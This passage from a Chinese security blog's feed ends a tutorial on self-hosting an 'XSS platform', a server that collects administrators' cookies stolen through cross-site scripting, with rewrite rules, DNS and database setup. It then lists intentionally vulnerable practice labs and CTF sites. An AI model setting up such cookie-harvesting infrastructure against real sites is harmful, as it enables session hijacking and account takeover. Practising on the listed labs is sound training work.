id="0x05-开始搭建"><a href="#0x05-开始搭建" class="headerlink" title="0x05 开始搭建"></a>0x05 开始搭建</h1><h2 id="5-1-新建站点"><a href="#5-1-新建站点" class="headerlink" title="5.1 新建站点"></a>5.1 新建站点</h2><p>首先需要在宝塔面板中新建一个站点叫<code>xss.你的域名.com</code></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190929003833.png" class="lozad"></p><p>需要从GitHub中下载xss平台的源码<a href="https://github.com/78778443/xssplatform" target="_blank" rel="noopener">传送门</a>，下载好源码后，上传到<code>xss.你的域名.com</code>站点下，记住，需要将压缩包的内容解压到站点根目录下。</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190929004025.png" class="lozad"></p><h2 id="2-2设置伪静态"><a href="#2-2设置伪静态" class="headerlink" title="2.2设置伪静态"></a>2.2设置伪静态</h2><p>在网站-&gt;设置</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190929004153.png" class="lozad"></p><p>在伪静态中添加相关带代码</p><p>【apache方式】</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;IfModule mod_rewrite.c&gt;</span><br><span class="line">RewriteEngine On</span><br><span class="line">RewriteBase /</span><br><span class="line">RewriteRule ^([0-9a-zA-Z]&#123;6&#125;)$ /index.php?do=code&amp;urlKey=$1 [L]</span><br><span class="line">RewriteRule ^do/auth/(\w+?)(/domain/([\w\.]+?))?$  /index.php?do=do&amp;auth=$1&amp;domain=$3 [L]</span><br><span class="line">RewriteRule ^register/(.*?)$ /index.php?do=register&amp;key=$1 [L]</span><br><span class="line">RewriteRule ^register-validate/(.*?)$ /index.php?do=register&amp;act=validate&amp;key=$1 [L]</span><br><span class="line">&lt;/IfModule&gt;</span><br></pre></td></tr></table></figure><p>【nginx方式】</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">rewrite &quot;^/([0-9a-zA-Z]&#123;6&#125;)&quot; /index.php?do=code&amp;urlKey=1 last;</span><br><span class="line">rewrite &quot;^/do/auth/(\w+?)(/domain/([\w.]+?))?&quot; /index.php?do=do&amp;auth=1&amp;domain=3 last;</span><br><span class="line">rewrite &quot;^/register/(.*?)&quot; /index.php?do=register&amp;key=1 last;</span><br><span class="line">rewrite &quot;^/register-validate/(.*?)&quot; /index.php?do=register&amp;act=validate&amp;key=$1 last;</span><br></pre></td></tr></table></figure><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190929004245.png" class="lozad"></p><h2 id="2-2-设置域名解析"><a href="#2-2-设置域名解析" class="headerlink" title="2.2 设置域名解析"></a>2.2 设置域名解析</h2><p>添加域名解析，子域名设置为xss，记录为A ，记录值为VPS ip地址。</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190929005237.png" class="lozad"></p><h2 id="2-4-设置数据库"><a href="#2-4-设置数据库" class="headerlink" title="2.4 设置数据库"></a>2.4 设置数据库</h2><p>宝塔面板中 ，数据库-&gt;添加数据库</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190929005501.png" class="lozad"></p><h2 id="2-5-开始安装"><a href="#2-5-开始安装" class="headerlink" title="2.5 开始安装"></a>2.5 开始安装</h2><p>输入域名开始安装</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190929005533.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190929005739.png" class="lozad"></p><p>然后点击下一步出现数据库导入成功就说明安装好了。</p><h1 id="0x06-使用"><a href="#0x06-使用" class="headerlink" title="0x06 使用"></a>0x06 使用</h1><p>输入域名访问</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190929010153.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190929010238.png" class="lozad"></p><hr>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;​    XSS——跨站脚本攻击，是一个主流的web安全漏洞，主要分为反射型、存储型和DOM型。攻击者可以利用XSS漏洞获取管理员的cookie信息，然后使用该cookie信息登陆到系统后台，从而进一步攻破系统。而打管理员cookie信息的平台就叫XSS平台，晚上也有很多搭建好的，虽然也能注册使用，但是你打到的cookie别人也能看到，这样的话，总感觉不安全，所以就自己搭建了一个平台自己使用，哈哈哈。&lt;/p&gt;
    
    </summary>
    
      <category term="安全工具" scheme="https://www.mad-coding.cn/categories/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/"/>
    
    
      <category term="XSS平台" scheme="https://www.mad-coding.cn/tags/XSS%E5%B9%B3%E5%8F%B0/"/>
    
  </entry>
  
  <entry>
    <title>渗透测试实战靶场</title>
    <link href="https://www.mad-coding.cn/2019/09/26/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA/"/>
    <id>https://www.mad-coding.cn/2019/09/26/渗透测试实战靶场/</id>
    <published>2019-09-26T01:00:46.000Z</published>
    <updated>2019-10-28T08:46:00.391Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>在学习渗透测试的过程中，光学理论知识是不够的，还需要结合实战来进行学习。但是国家法律是不允许我们对互联网上的web站在未授权的情况下进行渗透测试的，所以我们只能通过自己搭建环境来进行学习。下面给大家分享一些靶场，免得大家再去寻找。</p><a id="more"></a><h1 id="0x01-Vulnerable-Web-Applications"><a href="#0x01-Vulnerable-Web-Applications" class="headerlink" title="0x01 Vulnerable Web Applications"></a>0x01 <strong>Vulnerable Web Applications</strong></h1><table><thead><tr><th>BadStore</th><th><a href="http://www.badstore.net/" target="_blank" rel="noopener">http://www.badstore.net/</a></th></tr></thead><tbody><tr><td>BodgeIt Store</td><td><a href="http://code.google.com/p/bodgeit/" target="_blank" rel="noopener">http://code.google.com/p/bodgeit/</a></td></tr><tr><td>Butterfly Security Project</td><td><a href="http://thebutterflytmp.sourceforge.net/" target="_blank" rel="noopener">http://thebutterflytmp.sourceforge.net/</a></td></tr><tr><td>bWAPP</td><td><a href="http://www.mmeit.be/bwapp/" target="_blank" rel="noopener">http://www.mmeit.be/bwapp/</a>  <a href="http://sourceforge.net/projects/bwapp/files/bee-box/" target="_blank" rel="noopener">http://sourceforge.net/projects/bwapp/files/bee-box/</a></td></tr><tr><td>Commix</td><td><a href="https://github.com/stasinopoulos/commix-testbed" target="_blank" rel="noopener">https://github.com/stasinopoulos/commix-testbed</a></td></tr><tr><td>CryptOMG</td><td><a href="https://github.com/SpiderLabs/CryptOMG" target="_blank" rel="noopener">https://github.com/SpiderLabs/CryptOMG</a></td></tr><tr><td>Damn Vulnerable Node Application (DVNA)</td><td><a href="https://github.com/quantumfoam/DVNA/" target="_blank" rel="noopener">https://github.com/quantumfoam/DVNA/</a></td></tr><tr><td>Damn Vulnerable Web App (DVWA)</td><td><a href="http://www.dvwa.co.uk/" target="_blank" rel="noopener">http://www.dvwa.co.uk/</a></td></tr><tr><td>Damn Vulnerable Web Services (DVWS)</td><td><a href="http://dvws.professionallyevil.com/" target="_blank" rel="noopener">http://dvws.professionallyevil.com/</a></td></tr><tr><td>Drunk Admin Web Hacking Challenge</td><td><a href="https://bechtsoudis.com/work-stuff/challenges/drunk-admin-web-hacking-challenge/" target="_blank" rel="noopener">https://bechtsoudis.com/work-stuff/challenges/drunk-admin-web-hacking-challenge/</a></td></tr><tr><td>Exploit KB Vulnerable Web App</td><td><a href="http://exploit.co.il/projects/vuln-web-app/" target="_blank" rel="noopener">http://exploit.co.il/projects/vuln-web-app/</a></td></tr><tr><td>Foundstone Hackme Bank</td><td><a href="http://www.mcafee.com/us/downloads/free-tools/hacme-bank.aspx" target="_blank" rel="noopener">http://www.mcafee.com/us/downloads/free-tools/hacme-bank.aspx</a></td></tr><tr><td>Foundstone Hackme Books</td><td><a href="http://www.mcafee.com/us/downloads/free-tools/hacmebooks.aspx" target="_blank" rel="noopener">http://www.mcafee.com/us/downloads/free-tools/hacmebooks.aspx</a></td></tr><tr><td>Foundstone Hackme Casino</td><td><a href="http://www.mcafee.com/us/downloads/free-tools/hacme-casino.aspx" target="_blank" rel="noopener">http://www.mcafee.com/us/downloads/free-tools/hacme-casino.aspx</a></td></tr><tr><td>Foundstone Hackme Shipping</td><td><a href="http://www.mcafee.com/us/downloads/free-tools/hacmeshipping.aspx" target="_blank" rel="noopener">http://www.mcafee.com/us/downloads/free-tools/hacmeshipping.aspx</a></td></tr><tr><td>Foundstone Hackme Travel</td><td><a href="http://www.mcafee.com/us/downloads/free-tools/hacmetravel.aspx" target="_blank" rel="noopener">http://www.mcafee.com/us/downloads/free-tools/hacmetravel.aspx</a></td></tr><tr><td>GameOver</td><td><a href="http://sourceforge.net/projects/null-gameover/" target="_blank" rel="noopener">http://sourceforge.net/projects/null-gameover/</a></td></tr><tr><td>hackxor</td><td><a href="http://hackxor.sourceforge.net/cgi-bin/index.pl" target="_blank" rel="noopener">http://hackxor.sourceforge.net/cgi-bin/index.pl</a></td></tr><tr><td>Hackazon</td><td><a href="https://github.com/rapid7/hackazon" target="_blank" rel="noopener">https://github.com/rapid7/hackazon</a></td></tr><tr><td>LAMPSecurity</td><td><a href="http://sourceforge.net/projects/lampsecurity/" target="_blank" rel="noopener">http://sourceforge.net/projects/lampsecurity/</a></td></tr><tr><td>Moth</td><td><a href="http://www.bonsai-sec.com/en/research/moth.php" target="_blank" rel="noopener">http://www.bonsai-sec.com/en/research/moth.php</a></td></tr><tr><td>NOWASP / Mutillidae 2</td><td><a href="http://sourceforge.net/projects/mutillidae/" target="_blank" rel="noopener">http://sourceforge.net/projects/mutillidae/</a></td></tr><tr><td>OWASP BWA</td><td><a href="http://code.google.com/p/owaspbwa/" target="_blank" rel="noopener">http://code.google.com/p/owaspbwa/</a></td></tr><tr><td>OWASP Hackademic</td><td><a href="http://hackademic1.teilar.gr/" target="_blank" rel="noopener">http://hackademic1.teilar.gr/</a></td></tr><tr><td>OWASP SiteGenerator</td><td><a href="https://www.owasp.org/index.php/Owasp_SiteGenerator" target="_blank" rel="noopener">https://www.owasp.org/index.php/Owasp_SiteGenerator</a></td></tr><tr><td>OWASP Bricks</td><td><a href="http://sourceforge.net/projects/owaspbricks/" target="_blank" rel="noopener">http://sourceforge.net/projects/owaspbricks/</a></td></tr><tr><td>OWASP Security Shepherd</td><td><a href="https://www.owasp.org/index.php/OWASP_Security_Shepherd" target="_blank" rel="noopener">https://www.owasp.org/index.php/OWASP_Security_Shepherd</a></td></tr><tr><td>PentesterLab</td><td><a href="https://pentesterlab.com/" target="_blank" rel="noopener">https://pentesterlab.com/</a></td></tr><tr><td>PHDays iBank CTF</td><td><a href="http://blog.phdays.com/2012/05/once-again-about-remote-banking.html" target="_blank" rel="noopener">http://blog.phdays.com/2012/05/once-again-about-remote-banking.html</a></td></tr><tr><td>SecuriBench</td><td><a href="http://suif.stanford.edu/~livshits/securibench/" target="_blank" rel="noopener">http://suif.stanford.edu/~livshits/securibench/</a></td></tr><tr><td>SentinelTestbed</td><td><a href="https://github.com/dobin/SentinelTestbed" target="_blank" rel="noopener">https://github.com/dobin/SentinelTestbed</a></td></tr><tr><td>SocketToMe</td><td><a href="http://digi.ninja/projects/sockettome.php" target="_blank" rel="noopener">http://digi.ninja/projects/sockettome.php</a></td></tr><tr><td>sqli-labs</td><td><a href="https://github.com/Audi-1/sqli-labs" target="_blank" rel="noopener">https://github.com/Audi-1/sqli-labs</a></td></tr><tr><td>MCIR (Magical Code Injection Rainbow)</td><td><a href="https://github.com/SpiderLabs/MCIR" target="_blank" rel="noopener">https://github.com/SpiderLabs/MCIR</a></td></tr><tr><td>sqlilabs</td><td><a href="https://github.com/himadriganguly/sqlilabs" target="_blank" rel="noopener">https://github.com/himadriganguly/sqlilabs</a></td></tr><tr><td>VulnApp</td><td><a href="http://www.nth-dimension.org.uk/blog.php?id=88" target="_blank" rel="noopener">http://www.nth-dimension.org.uk/blog.php?id=88</a></td></tr><tr><td>PuzzleMall</td><td><a href="http://code.google.com/p/puzzlemall/" target="_blank" rel="noopener">http://code.google.com/p/puzzlemall/</a></td></tr><tr><td>WackoPicko</td><td><a href="https://github.com/adamdoupe/WackoPicko" target="_blank" rel="noopener">https://github.com/adamdoupe/WackoPicko</a></td></tr><tr><td>WAED</td><td><a href="http://www.waed.info/" target="_blank" rel="noopener">http://www.waed.info</a></td></tr><tr><td>WebGoat.NET</td><td><a href="https://github.com/jerryhoff/WebGoat.NET" target="_blank" rel="noopener">https://github.com/jerryhoff/WebGoat.NET/</a></td></tr><tr><td>WebSecurity Dojo</td><td><a href="http://www.mavensecurity.com/web_security_dojo/" target="_blank" rel="noopener">http://www.mavensecurity.com/web_security_dojo/</a></td></tr><tr><td>XVWA</td><td><a href="https://github.com/s4n7h0/xvwa" target="_blank" rel="noopener">https://github.com/s4n7h0/xvwa</a></td></tr><tr><td>Zap WAVE</td><td><a href="http://code.google.com/p/zaproxy/downloads/detail?name=zap-wave-0.1.zip" target="_blank" rel="noopener">http://code.google.com/p/zaproxy/downloads/detail?name=zap-wave-0.1.zip</a></td></tr></tbody></table><h1 id="0x02-Vulnerable-Operating-System-Installations"><a href="#0x02-Vulnerable-Operating-System-Installations" class="headerlink" title="0x02 Vulnerable Operating System Installations"></a>0x02 <strong>Vulnerable Operating System Installations</strong></h1><table><thead><tr><th>21LTR</th><th><a href="http://21ltr.com/scenes/" target="_blank" rel="noopener">http://21ltr.com/scenes/</a></th></tr></thead><tbody><tr><td>Damn Vulnerable Linux</td><td><a href="http://sourceforge.net/projects/virtualhacking/files/os/dvl/" target="_blank" rel="noopener">http://sourceforge.net/projects/virtualhacking/files/os/dvl/</a></td></tr><tr><td>exploit-exercises - nebula, protostar, fusion</td><td><a href="http://exploit-exercises.com/download" target="_blank" rel="noopener">http://exploit-exercises.com/download</a></td></tr><tr><td>heorot: DE-ICE, hackerdemia</td><td><a href="http://hackingdojo.com/downloads/iso/De-ICE_S1.100.iso" target="_blank" rel="noopener">http://hackingdojo.com/downloads/iso/De-ICE_S1.100.iso</a> <a href="http://hackingdojo.com/downloads/iso/De-ICE_S1.110.iso" target="_blank" rel="noopener">http://hackingdojo.com/downloads/iso/De-ICE_S1.110.iso</a> <a href="http://hackingdojo.com/downloads/iso/De-ICE_S1.120.iso" target="_blank" rel="noopener">http://hackingdojo.com/downloads/iso/De-ICE_S1.120.iso</a> <a href="http://hackingdojo.com/downloads/iso/De-ICE_S2.100.iso" target="_blank" rel="noopener">http://hackingdojo.com/downloads/iso/De-ICE_S2.100.iso</a> <a href="http://hackingdojo.com/downloads/iso/De-ICE_S1.123.iso" target="_blank" rel="noopener">hackerdemia - http://hackingdojo.com/downloads/iso/De-ICE_S1.123.iso</a></td></tr><tr><td>Holynix</td><td><a href="http://sourceforge.net/projects/holynix/files/" target="_blank" rel="noopener">http://sourceforge.net/projects/holynix/files/</a></td></tr><tr><td>Kioptrix</td><td><a href="http://www.kioptrix.com/blog/" target="_blank" rel="noopener">http://www.kioptrix.com/blog/</a></td></tr><tr><td>LAMPSecurity</td><td><a href="http://sourceforge.net/projects/lampsecurity/" target="_blank" rel="noopener">http://sourceforge.net/projects/lampsecurity/</a></td></tr><tr><td>Metasploitable</td><td><a href="http://sourceforge.net/projects/virtualhacking/files/os/metasploitable/" target="_blank" rel="noopener">http://sourceforge.net/projects/virtualhacking/files/os/metasploitable/</a></td></tr><tr><td>neutronstar</td><td><a href="http://neutronstar.org/goatselinux.html" target="_blank" rel="noopener">http://neutronstar.org/goatselinux.html</a></td></tr><tr><td>PenTest Laboratory</td><td><a href="http://pentestlab.org/lab-in-a-box/" target="_blank" rel="noopener">http://pentestlab.org/lab-in-a-box/</a></td></tr><tr><td>Pentester Lab</td><td><a href="https://www.pentesterlab.com/exercises" target="_blank" rel="noopener">https://www.pentesterlab.com/exercises</a></td></tr><tr><td>pWnOS</td><td><a href="http://www.pwnos.com/" target="_blank" rel="noopener">http://www.pwnos.com/</a></td></tr><tr><td>RebootUser Vulnix</td><td><a href="http://www.rebootuser.com/?page_id=1041" target="_blank" rel="noopener">http://www.rebootuser.com/?page_id=1041</a></td></tr><tr><td>SecGame # 1: Sauron</td><td><a href="http://sg6-labs.blogspot.co.uk/2007/12/secgame-1-sauron.html" target="_blank" rel="noopener">http://sg6-labs.blogspot.co.uk/2007/12/secgame-1-sauron.html</a></td></tr><tr><td>scriptjunkie.us</td><td><a href="http://www.scriptjunkie.us/2012/04/the-hacker-games/" target="_blank" rel="noopener">http://www.scriptjunkie.us/2012/04/the-hacker-games/</a></td></tr><tr><td>UltimateLAMP</td><td><a href="http://www.amanhardikar.com/mindmaps/practice-links.html" target="_blank" rel="noopener">http://www.amanhardikar.com/mindmaps/practice-links.html</a></td></tr><tr><td>TurnKey Linux</td><td><a href="http://www.turnkeylinux.org/" target="_blank" rel="noopener">http://www.turnkeylinux.org/</a></td></tr><tr><td>Bitnami</td><td><a href="https://bitnami.com/stacks" target="_blank" rel="noopener">https://bitnami.com/stacks</a></td></tr><tr><td>Elastic Server</td><td><a href="http://elasticserver.com/" target="_blank" rel="noopener">http://elasticserver.com</a></td></tr><tr><td>OS Boxes</td><td><a href="http://www.osboxes.org/" target="_blank" rel="noopener">http://www.osboxes.org</a></td></tr><tr><td>VirtualBoxes</td><td><a href="http://virtualboxes.org/images/" target="_blank" rel="noopener">http://virtualboxes.org/images/</a></td></tr><tr><td>VirtualBox Virtual Appliances</td><td><a href="https://virtualboximages.com/" target="_blank" rel="noopener">https://virtualboximages.com/</a></td></tr><tr><td>CentOS</td><td><a href="http://www.centos.org/" target="_blank" rel="noopener">http://www.centos.org/</a></td></tr><tr><td>Default Windows Clients</td><td><a href="https://www.microsoft.com/en-us/evalcenter/evaluate-windows-10-enterprise" target="_blank" rel="noopener">https://www.microsoft.com/en-us/evalcenter/evaluate-windows-10-enterprise</a>  <a href="https://dev.windows.com/en-us/microsoft-edge/tools/vms/" target="_blank" rel="noopener">https://dev.windows.com/en-us/microsoft-edge/tools/vms/</a></td></tr><tr><td>Default Windows Server</td><td><a href="https://www.microsoft.com/en-us/evalcenter/evaluate-windows-server-technical-preview" target="_blank" rel="noopener">https://www.microsoft.com/en-us/evalcenter/evaluate-windows-server-technical-preview</a></td></tr><tr><td>Default VMWare vSphere</td><td><a href="http://www.vmware.com/products/vsphere/" target="_blank" rel="noopener">http://www.vmware.com/products/vsphere/</a></td></tr></tbody></table><h1 id="0x03-Sites-for-Downloading-Older-Versions-of-Various-Software"><a href="#0x03-Sites-for-Downloading-Older-Versions-of-Various-Software" class="headerlink" title="0x03 Sites for Downloading Older Versions of Various Software"></a>0x03 <strong>Sites for Downloading Older Versions of Various Software</strong></h1><table><thead><tr><th>Exploit-DB</th><th><a href="http://www.exploit-db.com/" target="_blank" rel="noopener">http://www.exploit-db.com/</a></th></tr></thead><tbody><tr><td>Old Apps</td><td><a href="http://www.oldapps.com/" target="_blank" rel="noopener">http://www.oldapps.com/</a></td></tr><tr><td>Old Version</td><td><a href="http://www.oldversion.com/" target="_blank" rel="noopener">http://www.oldversion.com/</a></td></tr><tr><td>VirtualHacking Repo</td><td><a href="https://www.amanhardikar.com/mindmaps/sourceforge.net/projects/virtualhacking/files/apps%40realworld/" target="_blank" rel="noopener">sourceforge.net/projects/virtualhacking/files/apps%40realworld/</a></td></tr></tbody></table><h1 id="0x04-Sites-by-Vendors-of-Security-Testing-Software"><a href="#0x04-Sites-by-Vendors-of-Security-Testing-Software" class="headerlink" title="0x04 Sites by Vendors of Security Testing Software"></a>0x04 <strong>Sites by Vendors of Security Testing Software</strong></h1><table><thead><tr><th>Acunetix acuforum</th><th><a href="http://testasp.vulnweb.com/" target="_blank" rel="noopener">http://testasp.vulnweb.com/</a></th></tr></thead><tbody><tr><td>Acunetix acublog</td><td><a href="http://testaspnet.vulnweb.com/" target="_blank" rel="noopener">http://testaspnet.vulnweb.com/</a></td></tr><tr><td>Acunetix acuart</td><td><a href="http://testphp.vulnweb.com/" target="_blank" rel="noopener">http://testphp.vulnweb.com/</a></td></tr><tr><td>Cenzic crackmebank</td><td><a href="http://crackme.cenzic.com/" target="_blank" rel="noopener">http://crackme.cenzic.com</a></td></tr><tr><td>HP freebank</td><td><a href="http://zero.webappsecurity.com/" target="_blank" rel="noopener">http://zero.webappsecurity.com</a></td></tr><tr><td>IBM altoromutual</td><td><a href="http://demo.testfire.net/" target="_blank" rel="noopener">http://demo.testfire.net/</a></td></tr><tr><td>Mavituna testsparker</td><td><a href="http://aspnet.testsparker.com/" target="_blank" rel="noopener">http://aspnet.testsparker.com</a></td></tr><tr><td>Mavituna testsparker</td><td><a href="http://php.testsparker.com/" target="_blank" rel="noopener">http://php.testsparker.com</a></td></tr><tr><td>NTOSpider Test Site</td><td><a href="http://www.webscantest.com/" target="_blank" rel="noopener">http://www.webscantest.com/</a></td></tr></tbody></table><h1 id="0x05-Sites-for-Improving-Your-Hacking-Skills"><a href="#0x05-Sites-for-Improving-Your-Hacking-Skills" class="headerlink" title="0x05 Sites for Improving Your Hacking Skills"></a>0x05 <strong>Sites for Improving Your Hacking Skills</strong></h1><table><thead><tr><th>Embedded Security CTF</th><th><a href="https://microcorruption.com/" target="_blank" rel="noopener">https://microcorruption.com</a></th></tr></thead><tbody><tr><td>EnigmaGroup</td><td><a href="http://www.enigmagroup.org/" target="_blank" rel="noopener">http://www.enigmagroup.org/</a></td></tr><tr><td>Escape</td><td><a href="http://escape.alf.nu/" target="_blank" rel="noopener">http://escape.alf.nu/</a></td></tr><tr><td>Google Gruyere</td><td><a href="http://google-gruyere.appspot.com/" target="_blank" rel="noopener">http://google-gruyere.appspot.com/</a></td></tr><tr><td>Gh0st Lab</td><td><a href="http://www.gh0st.net/" target="_blank" rel="noopener">http://www.gh0st.net/</a></td></tr><tr><td>Hack This Site</td><td><a href="http://www.hackthissite.org/" target="_blank" rel="noopener">http://www.hackthissite.org/</a></td></tr><tr><td>HackThis</td><td><a href="http://www.hackthis.co.uk/" target="_blank" rel="noopener">http://www.hackthis.co.uk/</a></td></tr><tr><td>HackQuest</td><td><a href="http://www.hackquest.com/" target="_blank" rel="noopener">http://www.hackquest.com/</a></td></tr><tr><td>Hack.me</td><td><a href="https://hack.me/" target="_blank" rel="noopener">https://hack.me</a></td></tr><tr><td>Hacking-Lab</td><td><a href="https://www.hacking-lab.com/" target="_blank" rel="noopener">https://www.hacking-lab.com</a></td></tr><tr><td>Hacker Challenge</td><td><a href="http://www.dareyourmind.net/" target="_blank" rel="noopener">http://www.dareyourmind.net/</a></td></tr><tr><td>Hacker Test</td><td><a href="http://www.hackertest.net/" target="_blank" rel="noopener">http://www.hackertest.net/</a></td></tr><tr><td>hACME Game</td><td><a href="http://www.hacmegame.org/" target="_blank" rel="noopener">http://www.hacmegame.org/</a></td></tr><tr><td>Halls Of Valhalla</td><td><a href="http://halls-of-valhalla.org/beta/challenges" target="_blank" rel="noopener">http://halls-of-valhalla.org/beta/challenges</a></td></tr><tr><td>Hax.Tor</td><td><a href="http://hax.tor.hu/" target="_blank" rel="noopener">http://hax.tor.hu/</a></td></tr><tr><td>OverTheWire</td><td><a href="http://www.overthewire.org/wargames/" target="_blank" rel="noopener">http://www.overthewire.org/wargames/</a></td></tr><tr><td>PentestIT</td><td><a href="http://www.pentestit.ru/en/" target="_blank" rel="noopener">http://www.pentestit.ru/en/</a></td></tr><tr><td>CSC Play on Demand</td><td><a href="https://pod.cybersecuritychallenge.org.uk/" target="_blank" rel="noopener">https://pod.cybersecuritychallenge.org.uk/</a></td></tr><tr><td>pwn0</td><td><a href="https://pwn0.com/home.php" target="_blank" rel="noopener">https://pwn0.com/home.php</a></td></tr><tr><td>RootContest</td><td><a href="http://rootcontest.com/" target="_blank" rel="noopener">http://rootcontest.com/</a></td></tr><tr><td>Root Me</td><td><a href="http://www.root-me.org/?lang=en" target="_blank" rel="noopener">http://www.root-me.org/?lang=en</a></td></tr><tr><td>Security Treasure Hunt</td><td><a href="http://www.securitytreasurehunt.com/" target="_blank" rel="noopener">http://www.securitytreasurehunt.com/</a></td></tr><tr><td>Smash The Stack</td><td><a href="http://www.smashthestack.org/" target="_blank" rel="noopener">http://www.smashthestack.org/</a></td></tr><tr><td>SQLZoo</td><td><a href="http://sqlzoo.net/hack/" target="_blank" rel="noopener">http://sqlzoo.net/hack/</a></td></tr><tr><td>TheBlackSheep and Erik</td><td><a href="http://www.bright-shadows.net/" target="_blank" rel="noopener">http://www.bright-shadows.net/</a></td></tr><tr><td>ThisIsLegal</td><td><a href="http://thisislegal.com/" target="_blank" rel="noopener">http://thisislegal.com/</a></td></tr><tr><td>Try2Hack</td><td><a href="http://www.try2hack.nl/" target="_blank" rel="noopener">http://www.try2hack.nl/</a></td></tr><tr><td>WabLab</td><td><a href="http://www.wablab.com/hackme" target="_blank" rel="noopener">http://www.wablab.com/hackme</a></td></tr><tr><td>XSS: Can You XSS This?</td><td><a href="http://canyouxssthis.com/HTMLSanitizer/" target="_blank" rel="noopener">http://canyouxssthis.com/HTMLSanitizer/</a></td></tr><tr><td>XSS Game</td><td><a href="https://xss-game.appspot.com/" target="_blank" rel="noopener">https://xss-game.appspot.com/</a></td></tr><tr><td>XSS: ProgPHP</td><td><a href="http://xss.progphp.com/" target="_blank" rel="noopener">http://xss.progphp.com/</a></td></tr></tbody></table><h1 id="0x06-CTF-Sites-Archives"><a href="#0x06-CTF-Sites-Archives" class="headerlink" title="0x06 CTF Sites / Archives"></a>0x06 <strong>CTF Sites / Archives</strong></h1><table><thead><tr><th>CAPTF Repo</th><th><a href="http://captf.com/" target="_blank" rel="noopener">http://captf.com/</a></th></tr></thead><tbody><tr><td>CTFtime (Details of CTF Challenges)</td><td><a href="http://ctftime.org/ctfs/" target="_blank" rel="noopener">http://ctftime.org/ctfs/</a></td></tr><tr><td>CTF write-ups repository</td><td><a href="https://github.com/ctfs" target="_blank" rel="noopener">https://github.com/ctfs</a></td></tr><tr><td>Reddit CTF Announcements</td><td><a href="http://www.reddit.com/r/securityctf" target="_blank" rel="noopener">http://www.reddit.com/r/securityctf</a></td></tr><tr><td>shell-storm Repo</td><td><a href="http://shell-storm.org/repo/CTF/" target="_blank" rel="noopener">http://shell-storm.org/repo/CTF/</a></td></tr><tr><td>VulnHub</td><td><a href="https://www.vulnhub.com/" target="_blank" rel="noopener">https://www.vulnhub.com</a></td></tr></tbody></table><h1 id="0x07-Mobile-Apps"><a href="#0x07-Mobile-Apps" class="headerlink" title="0x07 Mobile Apps"></a>0x07 <strong>Mobile Apps</strong></h1><table><thead><tr><th>Damn Vulnerable Android App (DVAA)</th><th><a href="https://code.google.com/p/dvaa/" target="_blank" rel="noopener">https://code.google.com/p/dvaa/</a></th></tr></thead><tbody><tr><td>Damn Vulnerable FirefoxOS Application (DVFA)</td><td><a href="https://github.com/pwnetrationguru/dvfa/" target="_blank" rel="noopener">https://github.com/pwnetrationguru/dvfa/</a></td></tr><tr><td>Damn Vulnerable iOS App (DVIA)</td><td><a href="http://damnvulnerableiosapp.com/" target="_blank" rel="noopener">http://damnvulnerableiosapp.com/</a></td></tr><tr><td>ExploitMe Mobile Android Labs</td><td><a href="http://securitycompass.github.io/AndroidLabs/" target="_blank" rel="noopener">http://securitycompass.github.io/AndroidLabs/</a></td></tr><tr><td>ExploitMe Mobile iPhone Labs</td><td><a href="http://securitycompass.github.io/iPhoneLabs/" target="_blank" rel="noopener">http://securitycompass.github.io/iPhoneLabs/</a></td></tr><tr><td>Hacme Bank Android</td><td><a href="http://www.mcafee.com/us/downloads/free-tools/hacme-bank-android.aspx" target="_blank" rel="noopener">http://www.mcafee.com/us/downloads/free-tools/hacme-bank-android.aspx</a></td></tr><tr><td>InsecureBank</td><td><a href="http://www.paladion.net/downloadapp.html" target="_blank" rel="noopener">http://www.paladion.net/downloadapp.html</a></td></tr><tr><td>NcN Wargame</td><td><a href="http://noconname.org/evento/wargame/" target="_blank" rel="noopener">http://noconname.org/evento/wargame/</a></td></tr><tr><td>OWASP iGoat</td><td><a href="http://code.google.com/p/owasp-igoat/" target="_blank" rel="noopener">http://code.google.com/p/owasp-igoat/</a></td></tr><tr><td>OWASP Goatdroid</td><td><a href="https://github.com/jackMannino/OWASP-GoatDroid-Project" target="_blank" rel="noopener">https://github.com/jackMannino/OWASP-GoatDroid-Project</a></td></tr></tbody></table><h1 id="0x08-Lab"><a href="#0x08-Lab" class="headerlink" title="0x08 Lab"></a>0x08 <strong>Lab</strong></h1><table><thead><tr><th>binjitsu</th><th><a href="https://github.com/binjitsu/binjitsu" target="_blank" rel="noopener">https://github.com/binjitsu/binjitsu</a></th></tr></thead><tbody><tr><td>CTFd</td><td><a href="https://github.com/isislab/CTFd" target="_blank" rel="noopener">https://github.com/isislab/CTFd</a></td></tr><tr><td>Mellivora</td><td><a href="https://github.com/Nakiami/mellivora" target="_blank" rel="noopener">https://github.com/Nakiami/mellivora</a></td></tr><tr><td>NightShade</td><td><a href="https://github.com/UnrealAkama/NightShade" target="_blank" 